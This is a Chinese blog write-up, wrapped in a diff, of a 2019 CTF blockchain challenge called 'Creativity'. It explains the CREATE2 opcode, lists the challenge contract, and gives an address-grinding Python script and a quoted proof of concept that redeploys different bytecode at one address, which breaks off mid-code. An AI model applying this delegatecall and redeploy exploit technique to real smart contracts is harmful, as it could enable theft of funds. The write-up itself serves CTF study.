@@ -1,0 +1,966 @@
+<!DOCTYPE html>
+<html lang="CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Sissel">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Sissel">
+    
+    <meta name="keywords" content="天枢,Dubhe,CTFer,程序员">
+    
+    <meta name="description" content="长颈鹿的脖子为什么那么长？">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>【区块链】Hitcon2019-区块链-Creativity · Sissel&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Sissel&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">【区块链】Hitcon2019-区块链-Creativity</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Sissel's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            【区块链】Hitcon2019-区块链-Creativity
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "天枢">天枢</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.2k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/01/20</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>考察create2指令，Hitcon我认为最难的一个区块链题目，我是这个题目所有参赛队伍的唯一解！</p>
+<a id="more"></a>
+<p>出题人博客及题解：<a target="_blank" rel="noopener" href="https://x9453.github.io/2020/01/04/Balsn-CTF-2019-Creativity/">https://x9453.github.io/2020/01/04/Balsn-CTF-2019-Creativity/</a></p>
+<p>create2 是EIP1014提出的新的asm opcode，其设计出来主要为了做 代理合约使用。</p>
+<p>我们说在外部地址创建合约的时候，新的合约地址是可以算出来的。算出来的脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web3</span><br><span class="line"><span class="keyword">import</span> rlp</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> web3.auto <span class="keyword">import</span> w3</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span>  ProcessPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">contract_addr</span>(<span class="params">sender, nonce</span>):</span></span><br><span class="line">    <span class="keyword">return</span> web3.Web3.keccak(rlp.encode([sender,nonce]))[<span class="number">12</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_exist_acc</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;acc-1.csv&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">    retl = lines[<span class="number">0</span>].strip().split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">del</span> lines[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;acc-1.csv&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            f.write(line)</span><br><span class="line">    <span class="keyword">return</span> retl[<span class="number">0</span>], retl[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_acc</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        acct = w3.eth.account.create()</span><br><span class="line">        sender = web3.Web3.toBytes(hexstr=acct.address)</span><br><span class="line">        <span class="keyword">if</span> web3.Web3.toHex(contract_addr(sender,<span class="number">0</span>))[<span class="number">-3</span>:] == <span class="string">&#x27;fff&#x27;</span>:</span><br><span class="line">            print(<span class="string">f&quot;<span class="subst">&#123;acct.address&#125;</span>,<span class="subst">&#123;web3.Web3.toHex(acct.privateKey)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> acct.address, web3.Web3.toHex(acct.privateKey)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi_process_entry</span>():</span></span><br><span class="line">    fw = <span class="built_in">open</span>(<span class="string">&#x27;acc.csv&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    acc_addr, acc_key = generate_acc()</span><br><span class="line">    fw.write(<span class="string">f&quot;<span class="subst">&#123;acc_addr&#125;</span>,<span class="subst">&#123;acc_key&#125;</span>\n&quot;</span>)</span><br><span class="line">    fw.flush()</span><br><span class="line">    fw.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    ex = ProcessPoolExecutor(max_workers=<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    fw = <span class="built_in">open</span>(<span class="string">&#x27;acc.csv&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        ex.submit(multi_process_entry)</span><br><span class="line">        <span class="comment"># if i % 100 == 0:</span></span><br><span class="line">        <span class="comment">#     print(f&quot;Account &#123;i&#125;&quot;, end=&quot;\r&quot;)</span></span><br><span class="line">        <span class="comment">#     ret = ex.submit(generate_acc)</span></span><br><span class="line">        <span class="comment">#     ret.result()</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     ex.submit(generate_acc)</span></span><br></pre></td></tr></table></figure>
+<p>其中，RLP (递归长度前缀)提供了一种适用于任意二进制数据数组的编码，RLP已经成为以太坊中对对象进行序列化的主要编码方式。实现方式为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rlp_encode</span>(<span class="params"><span class="built_in">input</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(<span class="built_in">input</span>,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">input</span>) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">chr</span>(<span class="built_in">input</span>) &lt; <span class="number">128</span>: <span class="keyword">return</span> <span class="built_in">input</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">return</span> encode_length(<span class="built_in">len</span>(<span class="built_in">input</span>),<span class="number">128</span>) + <span class="built_in">input</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(<span class="built_in">input</span>,<span class="built_in">list</span>):</span><br><span class="line">        output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">input</span>: output += rlp_encode(item)</span><br><span class="line">        <span class="keyword">return</span> encode_length(<span class="built_in">len</span>(output),<span class="number">192</span>) + output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_length</span>(<span class="params">L,offset</span>):</span></span><br><span class="line">    <span class="keyword">if</span> L &lt; <span class="number">56</span>:</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">chr</span>(L + offset)</span><br><span class="line">    <span class="keyword">elif</span> L &lt; <span class="number">256</span>**<span class="number">8</span>:</span><br><span class="line">         BL = to_binary(L)</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">len</span>(BL) + offset + <span class="number">55</span>) + BL</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">raise</span> Exception(<span class="string">&quot;input too long&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_binary</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">if</span> x == <span class="number">0</span> <span class="keyword">else</span> to_binary(<span class="built_in">int</span>(x / <span class="number">256</span>)) + <span class="built_in">chr</span>(x % <span class="number">256</span>)</span><br></pre></td></tr></table></figure>
+<p>题目</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract Creativity &#123;</span><br><span class="line">    event SendFlag(address addr);</span><br><span class="line">    </span><br><span class="line">    address public target;</span><br><span class="line">    uint randomNumber = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">address _addr</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123; <span class="attr">size</span> := extcodesize(_addr) &#125;</span><br><span class="line">        <span class="built_in">require</span>(size &gt; <span class="number">0</span> &amp;&amp; size &lt;= <span class="number">4</span>);</span><br><span class="line">        target = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(target != address(<span class="number">0</span>));</span><br><span class="line">        target.delegatecall(abi.encodeWithSignature(<span class="string">&quot;&quot;</span>));</span><br><span class="line">        selfdestruct(address(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sendFlag</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value &gt;= <span class="number">100000000</span> ether);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>限制了和题目合约交互的必须是 合约 <code>require(size &gt; 0 &amp;&amp; size &lt;= 4);</code> 其中delegatecall可以把其他合约的代码拿过来，在自己的合约环境下执行。</p>
+<p>正常来说攻击方式是这样的，题目合约为Q ：</p>
+<ol>
+<li>构造一个攻击合约 ATTACK，长度小于4【就算是return一个num，也至少要10个opcode。能做的事很少】</li>
+<li>调用Q.check(ATTACK)，变成Q.target = ATTACK</li>
+<li>调用Q.execute()，执行一次 SendFlag 的命令。</li>
+</ol>
+<p>部署合约的构建可以参照这个 <a target="_blank" rel="noopener" href="https://ropsten.etherscan.io/address/0xb3ecef15f61572129089a9704b33d53f56991df8#code">https://ropsten.etherscan.io/address/0xb3ecef15f61572129089a9704b33d53f56991df8#code</a>：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *Submitted for verification at Etherscan.io on 2019-02-15</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Jochem Brouwer &lt;jochembrouwer96@gmail.com&gt;</span></span><br><span class="line"><span class="comment">// Proof of concept: deploy a contract at the same address but with different bytecode </span></span><br><span class="line"><span class="comment">// Target address: 0x7973d5166b9526b9e4e63595293d6b895d2d4fe3</span></span><br><span class="line"><span class="comment">// Note: it is possible to replay this but if someone calls deployContract and deploys a contract without </span></span><br><span class="line"><span class="comment">// the possibility to selfdestruct then deployTEST1 and deployTEST2 will not work anymore (as in, they will not deploy their target code);</span></span><br><span class="line"><span class="comment">// of course it is still possible to replay it using a different seed than 0x1337 </span></span><br><span class="line"></span><br><span class="line">contract CREATE2DumpExternalBytecode &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;</span><br><span class="line">        <span class="comment">// read external bytecode </span></span><br><span class="line">        </span><br><span class="line">        CREATE2Rewriter sender = CREATE2Rewriter(msg.sender);</span><br><span class="line">        </span><br><span class="line">        bytes memory deployMe = sender.deployBytecode();</span><br><span class="line">        </span><br><span class="line">        uint bytecodeLength = deployMe.length;</span><br><span class="line">    </span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="comment">// this RETURN opcode reads two memory pointers from stack: the memory start position and the length </span></span><br><span class="line">            <span class="comment">// this normally puts the bytecode in the RETURNVALUE field of a CALL but instead on here this is the </span></span><br><span class="line">            <span class="comment">// actual code which gets deployed =)</span></span><br><span class="line">            <span class="keyword">return</span> (add(deployMe, <span class="number">0x20</span>), bytecodeLength)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract HelloWorld1 &#123;</span><br><span class="line">    string public Hello = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123; </span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract HelloWorld2 &#123;</span><br><span class="line">    string public Hello = <span class="string">&quot;HACKED&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CREATE2Rewriter &#123;</span><br><span class="line">    <span class="comment">// CREATE2DumpExternalBytecode constructor code </span></span><br><span class="line">    bytes constant <span class="title">constructorCode</span> = <span class="title">hex</span>&#x27;6080604052348015600<span class="title">f57600080fd5b506000339050606081600160a060020a03166331d191666040518163ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040160006040518083038186803b158015606b57600080fd5b505afa158015607e573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052602081101560a657600080fd5b81019080805164010000000081111560bd57600080fd5b8201602081018481111560cf57600080fd5b815164010000000081118282018710171560e857600080fd5b5050805190945092508291505060208301f3fe</span>&#x27;;</span><br><span class="line">    bytes public deployBytecode;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// HelloWorld1 / 2 bytecode which we want to deploy</span></span><br><span class="line">    bytes constant HelloWorld1_bytecode = hex<span class="string">&#x27;608060405260043610610045577c0100000000000000000000000000000000000000000000000000000000600035046383197ef0811461004a578063bcdfe0d514610061575b600080fd5b34801561005657600080fd5b5061005f6100eb565b005b34801561006d57600080fd5b506100766100ee565b6040805160208082528351818301528351919283929083019185019080838360005b838110156100b0578181015183820152602001610098565b50505050905090810190601f1680156100dd5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b33ff5b6000805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156101745780601f1061014957610100808354040283529160200191610174565b820191906000526020600020905b81548152906001019060200180831161015757829003601f168201915b50505050508156fea165627a7a72305820d655aa9f37fe27daa8e218b7712a2e641f2c18b5c8a9911e69cfc1c8336640390029&#x27;</span>;</span><br><span class="line">    bytes constant HelloWorld2_bytecode = hex<span 